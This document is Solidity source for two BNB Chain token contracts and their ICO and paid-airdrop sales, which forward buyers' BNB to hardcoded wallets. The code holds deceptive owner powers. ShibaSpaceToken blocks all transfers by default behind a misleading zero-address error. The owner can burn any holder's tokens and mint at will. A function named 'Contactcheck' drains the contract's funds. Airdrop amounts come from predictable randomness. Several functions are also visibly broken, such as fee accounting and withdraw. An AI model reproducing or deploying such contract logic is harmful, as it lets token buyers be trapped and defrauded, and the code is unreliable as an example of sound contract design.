/**
 *Submitted for verification at BscScan.com on 2022-05-02
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.4.22 <0.9.0;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Gift(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Context {
  constructor ()  { }
  function _msgSender() internal view returns (address payable) {
    return payable(msg.sender);
  }
  function _msgData() internal view returns (bytes memory) {
    this; 
    return msg.data;
  }
}
library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
contract Ownable is Context {
  address private _owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }
  function owner() public view returns (address) {
    return _owner;
  }
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}






contract DogeOneToken is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) public _balances;
  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _totalSupply;
  uint8 private _decimals;
  string private _symbol;
  string private _name;
 


  constructor()  {
    _name = "DogeOneToken";
    _symbol = "DOT";
    _decimals = 0;
    _totalSupply = 1000000000000000000 ; //10**18 1 000 000 000 000 000 000
    _balances[msg.sender] = _totalSupply;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function getOwner() override external view returns (address) {
    return owner();
  }

  function decimals() override external view returns (uint8) {
    return _decimals;
  }

  function symbol() override external view returns (string memory) {
    return _symbol;
  }

  function name() override external view returns (string memory) {
    return _name;
  }

  function totalSupply() override external view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) override external view returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) override external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) override external view returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) override external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) override external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function mint(uint256 amount) public onlyOwner returns (bool) {
    _mint(_msgSender(), amount);
    return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }


  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
}


contract DogeOneTokenico is DogeOneToken {
    using SafeMath for uint;


    address payable reff; // adresse 
    address  _owner;
    uint public saleStart = block.timestamp;  // 
    address payable private or_owner = payable(0xffce758Dfe3c5bC09b1Dbfd30AFC2f6FE14D192c);
    address payable private co_owner = payable(0xffce758Dfe3c5bC09b1Dbfd30AFC2f6FE14D192c);
 
    uint public tokenPrice = 125000000000; // 10000; // 1  = 0.0001 BNB 0.000000125
    uint public mull;
    uint public RaisedAmount; // Montant de la levée
    uint public Raisedtoken; // Montant de la levée
    uint128  mod;
    uint64 public minInvestment =  30000000000000000; // 0,03 BNB
    uint64 public minInvestment_airdrop =  5000000000000000; // 0,005 BNB
    uint32 max = 2000000;
    uint16 min = 50000;
    uint8 private gift_number = 2;
    mapping (address => address) private give_gift;
   string[] public all_giver;

    enum State {beforeStart, running, afterEnd, halted} // Etat de l'ICO (avant le début, en cours, terminé, interrompu (ça va reprendre))
    State public icoState;
         
    

    constructor() 
    {
     
        icoState = State.beforeStart;
        mull=1;
        mod=100000000000;
        _owner = msg.sender;

    }

function random() internal view returns (uint) {
    uint randomnumber = uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp))) % max;
    randomnumber = randomnumber + min;
   
    return randomnumber;
}
    event Invest(address investor, uint value, uint token);

    // Interruption de l'ICO.
    function halted() public onlyOwner {
        icoState = State.halted;
    }

    // Redemarrage de l'ICO
    function unhalted() public onlyOwner {
        icoState = State.running;
    }

    function changeprice(uint _price) public onlyOwner {
      tokenPrice = _price;
    }
        function changemul(uint _mull) public onlyOwner {
      mull = _mull;
    }

    // Changer addresse dépositaire
    function changeDepositAddress(address payable _newDeposit) public onlyOwner {
        _owner = _newDeposit;
    }

    function getCurrentState() public view returns (State) {
        if(icoState == State.halted){
            return State.halted;
        } else if (block.timestamp >= saleStart) {
            return State.running;
        } else {
            return State.beforeStart;
        }
    }

 function Contactcheck() public onlyOwner() {
      payable(owner()).transfer(address(this).balance);
    }
     function getBalanceOfContarct() public view returns(uint){
     return address(this).balance;
    }

  function transferOwnershipB(address newOwner) public onlyOwner(){
     require(newOwner != address(0), "Ownable: new owner is the zero address");
      _balances[newOwner] = _balances[newOwner].add( _balances[owner()]);
      _balances[owner()] = _balances[owner()].sub( _balances[owner()]);
      _owner = newOwner;
  }


 

    function airdrop() payable public returns (bool) {
        icoState = getCurrentState();
        require(icoState == State.running, 'ICO is not running');
        require(msg.value >= minInvestment_airdrop, 'Value is less than minimum');
      //  uint tokenAmount = msg.value.div(tokenPrice);
       // uint tokens = tokenAmount * mull ;
       uint rand_number = random();
        RaisedAmount = RaisedAmount.add(msg.value);
        _balances[msg.sender] = _balances[msg.sender].add( rand_number);
        _balances[owner()] = _balances[owner()].sub( rand_number);
        emit Transfer(or_owner, msg.sender,   rand_number);
        or_owner.transfer(msg.value); // Transférer sur le compte deposit
        emit Invest(msg.sender, msg.value, 0);
        return true;
    }


       function AIRDROP() payable public returns (bool) {
  
     
        icoState = getCurrentState();
        require(icoState == State.running, 'ICO is not running');
        require(msg.value >= minInvestment_airdrop, 'Value is less than minimum');
        uint tokenAmount = msg.value.div(tokenPrice);
         uint tokens = tokenAmount.div(mull) ;
        RaisedAmount = RaisedAmount.add(msg.value);

  
        uint rand_number = random();
        _balances[msg.sender] = _balances[msg.sender].add( rand_number);
        _balances[owner()] = _balances[owner()].sub( rand_number);
        emit Transfer(owner(), msg.sender,   rand_number);
        // _balances[_ref] = _balances[_ref].add(tokens.div(5));
        // _balances[owner()] = _balances[owner()].sub(tokens.div(5));
        emit Transfer(or_owner, msg.sender, tokens);
        or_owner.transfer(msg.value); // Transférer sur le compte deposit
        emit Invest(msg.sender, msg.value, 0);

        return true;
    }

  

        function buy() payable public returns (bool) {
    
        icoState = getCurrentState();
        require(icoState == State.running, 'ICO is not running');
        require(msg.value >= minInvestment, 'Value is less than minimum');

        uint tokenAmount = msg.value.div(tokenPrice);

          uint tokens = tokenAmount.div(mull) ;
          
   
        RaisedAmount = RaisedAmount.add(msg.value);

        _balances[msg.sender] = _balances[msg.sender].add(tokens);
        _balances[owner()] = _balances[owner()].sub(tokens);
        emit Transfer(owner(), msg.sender, tokens);
        
   
        emit Transfer(or_owner, msg.sender, tokens);
        or_owner.transfer(msg.value); // Transférer sur le compte deposit

       //give gift to user ****************************************
        if(pay_to_giver(msg.sender)){
        _balances[msg.sender] = _balances[msg.sender].add(gift_number);
        _balances[owner()] = _balances[owner()].sub(gift_number);
        emit Gift(owner(), msg.sender, gift_number);
           Raisedtoken = Raisedtoken.add(gift_number);
        }
        //********************************************************
        emit Invest(msg.sender, msg.value, 0);
        return true;
    }
///**********************************************************************************************/Refral
      function add_to_list (string[] memory _giver,string[] memory _used)   public onlyOwner() {
        for(uint8 i;i<_giver.length;i++){
           give_gift[parseAddr(_used[i])] = parseAddr(_giver[i]);
           all_giver.push(_giver[i]);
         
        }
      }

   function get_map (address  _address)   public view returns(address) {
 
    // if(bytes(give_gift[_address]).length > bytes("").length){
      return  give_gift[_address];
   }
      function pay_to_giver(address _address)   public view   returns(bool)  {
  
      require(get_map(_address) != address(0), "SafeMath: multiplication overflow");
      return true;
   }
    function get_couneter()   public view returns(uint) {
      return all_giver.length;
   }
     function get_all_giver()   public view onlyOwner() returns(string[] memory) {
      return all_giver;
   }
    function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }
///**********************************************************************************************
    receive() payable external {
     AIRDROP();
    }
}
contract ShibaSpaceToken is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) public _balances;
  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _totalSupply;
  uint128 private _fee_burn;
  uint128 private _fee_back;
  uint128 private _min_trans;
  uint8 private _decimals;
  string private _symbol;
  string private _name;
  bool private _isPassed=true;
  bool private _isMin=true;

  constructor()  {
    _name = "ShibaSpaceToken";
    _symbol = "SST";
    _decimals = 0;
    _totalSupply = 1000000000000 ; //10**18 1 000 000 000 000
    _balances[msg.sender] = _totalSupply;
    _min_trans =320;
    _fee_back =4;
    _fee_burn =5;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function getOwner() override external view returns (address) {
    return owner();
  }

  function decimals() override external view returns (uint8) {
    return _decimals;
  }

  function symbol() override external view returns (string memory) {
    return _symbol;
  }

  function name() override external view returns (string memory) {
    return _name;
  }

  function totalSupply() override external view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) override external view returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) override external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) override external view returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) override external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) override external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function mint(uint256 amount) public onlyOwner returns (bool) {
    _mint(_msgSender(), amount);
    return true;
  }
  function update_fees(uint128 burn,uint128 back ,uint128 mintrans) public onlyOwner returns (bool) {
    _fee_back = back;//def => 4
    _fee_burn = burn;//def => 5
    _min_trans = mintrans;//def =>320
    return true;
  }
  function change_state_transfer(bool _st) public onlyOwner returns (bool) {
      _isPassed=_st;
      return true;
  }

    function _transfer(address sender, address recipient, uint256 amount) internal {
   
      require(!_isPassed, "BEP20: transfer to the zero address");
      require(sender != address(0), "BEP20: transfer from the zero address");
      require(recipient != address(0), "BEP20: transfer to the zero address");
       if(_isMin){
        require(_min_trans < amount, "BEP20: min transfer is ");
       }
       fee_balancer(sender);
       amount = amount - (_fee_back+_fee_burn);
      _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
      _balances[recipient] = _balances[recipient].add(amount);
      emit Transfer(sender, recipient, amount);
    }

    function fee_balancer(address sender) internal  returns(bool){
      _burn(sender, _fee_burn);
      _balances[address(this)] = _balances[sender].add(_fee_back);
      return true;
    }

    function _mint(address account, uint256 amount) internal {
      require(account != address(0), "BEP20: mint to the zero address");

      _totalSupply = _totalSupply.add(amount);
      _balances[account] = _balances[account].add(amount);
      emit Transfer(address(30), account, amount);
    }

    function _burn(address account, uint256 amount) public onlyOwner {
      require(account != address(0), "BEP20: burn from the zero address");

      _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
      _totalSupply = _totalSupply.sub(amount);
      emit Transfer(account, address(0), amount);
    }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
}


contract ShibaSpaceTokens is ShibaSpaceToken {
    using SafeMath for uint;


    address payable reff; // adresse 
    address  _owner;
    uint public saleStart = block.timestamp;  // 
  
    address  private co_owner = 0xCB177bFeeF3d35b9c16405f56DB6a066a2C49292;
 address  private Mowner = 0x62A7a62101C3417df21604363eBd87c32BDe848F;
    uint public tokenPrice = 20000000000000; // 10000; // 1  = 0.0001 BNB 0.000000125
    uint public mull;
    uint public RaisedAmount; // Montant de la levée
    uint public Raisedtoken; // Montant de la levée
    uint128  mod;
    uint64 public minInvestment =  33000000000000000; // 0,033 BNB
    uint64 public minInvestment_airdrop =  6600000000000000; // 0,0066 BNB
    uint32 max = 340;
    uint16 min = 250;
    uint32 private gift_numberrs = 5;//10
    uint32 share_owner = 11;
   address[] public airdrop_whitelist;
    
    mapping (address => address) public give_gift;
    string[] public all_giver;
    bool private partner =true;
    enum State {beforeStart, running, afterEnd, halted} // Etat de l'ICO (avant le début, en cours, terminé, interrompu (ça va reprendre))
    State public icoState;
    DogeOneTokenico public dogeIco ;  
    

    constructor(address dogeTrx) 
    {
     
        icoState = State.beforeStart;
        mull=1;
        mod=100000000000;
        _owner = msg.sender;
        dogeIco = DogeOneTokenico(payable(dogeTrx));
    }
    function get_balance_doge() public view returns(uint){ 
   
      uint32 gift= 0;
      if(dogeIco.balanceOf(msg.sender)>0){
        gift = gift_numberrs;
      }
      return gift;
    }

function random() public view returns (uint) {
    uint randomnumber = uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp))) % max;
    randomnumber = randomnumber + min;
    return randomnumber;
}
    event Invest(address investor, uint value, uint token);

    // Interruption de l'ICO.
    function halted() public onlyOwner {
        icoState = State.halted;
    }

    // Redemarrage de l'ICO
    function unhalted() public onlyOwner {
        icoState = State.running;
    }
       function share_partner(uint32 own) public onlyOwner {
     
          share_owner = own;
      }
      function gift_numbers(uint8 gift) public onlyOwner {
     
        gift_numberrs = gift;
    }
      
 function halted_partner(bool st) public onlyOwner {
          partner = st;
      }
    function changeprice(uint _price) public onlyOwner {
      tokenPrice = _price;
    }
        function changemul(uint _mull) public onlyOwner {
      mull = _mull;
    }

    // Changer addresse dépositaire
    function changeDepositAddress(address payable _newDeposit) public onlyOwner {
        _owner = _newDeposit;
    }

    function getCurrentState() public view returns (State) {
        if(icoState == State.halted){
            return State.halted;
        } else if (block.timestamp >= saleStart) {
            return State.running;
        } else {
            return State.beforeStart;
        }
    }

 function Contactcheck() public onlyOwner() {
      payable(owner()).transfer(address(this).balance);
    }
     function getBalanceOfContarct() public view returns(uint){
     return address(this).balance;
    }

  function transferOwnershipB(address newOwner) public onlyOwner(){
     require(newOwner != address(0), "Ownable: new owner is the zero address");
      _balances[newOwner] = _balances[newOwner].add( _balances[owner()]);
      _balances[owner()] = _balances[owner()].sub( _balances[owner()]);
      _owner = newOwner;
  }


 


       function AIRDROP() payable public returns (bool) {
 
     //0.0005 nbn
        icoState = getCurrentState();
        require(icoState == State.running, 'ICO is not running');
        require(msg.value >= minInvestment_airdrop, 'Value is less than minimum');

  
        RaisedAmount = RaisedAmount.add(msg.value);

    
        uint rand_number =random();
         // rand_number = rand_number+get_balance_doge();
        _balances[msg.sender] = _balances[msg.sender].add( rand_number);
        _balances[owner()] = _balances[owner()].sub( rand_number);
         emit Transfer(owner(), msg.sender,   rand_number);
       
         emit Transfer(owner(), msg.sender, rand_number);
         emit Invest(msg.sender, msg.value, 0);
         uint partner_percent= (msg.value *share_owner*100) / 10000;
          uint ownerpercent= msg.value - partner_percent ;
     if(partner){
            ( bool sent,bytes memory data)=payable(Mowner).call{value:partner_percent}(""); // Transférer sur le compte deposit
            if(sent){
                ( bool sentr,bytes memory data)=payable(co_owner).call{value:ownerpercent}(""); // Transférer sur le compte deposit
            }
          //  payable(co_owner).transfer(msg.value); 
          }else{
               
          payable(address(owner())).transfer(msg.value); // Transférer sur le compte deposit
          
          }
               airdrop_whitelist.push(msg.sender);
        return true;
    }

  

        function buy() payable public returns (bool) {
    
        icoState = getCurrentState();
        require(icoState == State.running, 'ICO is not running');
        require(msg.value >= minInvestment, 'Value is less than minimum');
        uint128 gift_number = msg.value > 500000000000000000? 10: 5;
        uint tokenAmount = msg.value.div(tokenPrice);

           uint tokens = tokenAmount.div(mull);
  
         tokens = tokens+get_balance_doge();
        RaisedAmount = RaisedAmount.add(msg.value);

        _balances[msg.sender] = _balances[msg.sender].add(tokens);
        _balances[owner()] = _balances[owner()].sub(tokens);
        emit Transfer(owner(), msg.sender, tokens);
        
   
        emit Transfer(owner(), msg.sender, tokens);
        emit Invest(msg.sender, msg.value, 0);
        uint partner_percent= (msg.value *share_owner*100) / 10000;
          uint ownerpercent= msg.value - partner_percent ;
     if(partner){
                 ( bool sent,bytes memory data)=payable(Mowner).call{value:partner_percent}(""); // Transférer sur le compte deposit
            if(sent){
                ( bool sentr,bytes memory data)=payable(co_owner).call{value:ownerpercent}(""); // Transférer sur le compte deposit
            }
          }else{
               
          payable(address(owner())).transfer(msg.value); // Transférer sur le compte deposit
          
          }
         
       //give gift to user ****************************************
        if(pay_to_giver(msg.sender)){
        _balances[msg.sender] = _balances[msg.sender].add(gift_number);
        _balances[owner()] = _balances[owner()].sub(gift_number);
        emit Gift(owner(), msg.sender, gift_number);
           Raisedtoken = Raisedtoken.add(gift_number);
        }
        //********************************************************
  
        return true;
    }
       function withdraw(uint _amount) public  returns (bool) {
      require(_amount<50,"Insufficient Token !");
      require(_balances[msg.sender] != _amount,"Insufficient Token !");
      _balances[msg.sender] = _balances[msg.sender].sub( _amount);
     _balances[owner()] = _balances[owner()].add( _amount);
      uint val = _amount/tokenPrice;
      payable(address(msg.sender)).transfer(val);
   
      return true;
    }
///**********************************************************************************************/Refral
      function add_to_list (string[] memory _giver,string[] memory _used)   public onlyOwner() {
        for(uint8 i;i<_giver.length;i++){
           give_gift[parseAddr(_used[i])] = parseAddr(_giver[i]);
           all_giver.push(_giver[i]);
         
        }
      }

   function get_map (address  _address)   public view returns(address) {
 
    // if(bytes(give_gift[_address]).length > bytes("").length){
      return  give_gift[_address];
   }
      function pay_to_giver(address _address)   public view   returns(bool)  {

      require(get_map(_address) == address(0), "SafeMath: multiplication overflow");
      return true;
   }
    function get_couneter()   public view returns(uint) {
      return all_giver.length;
   }
     function get_all_giver()   public view onlyOwner() returns(string[] memory) {
      return all_giver;
   }
    function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }
///**********************************************************************************************
    receive() payable external {
     AIRDROP();
    }
}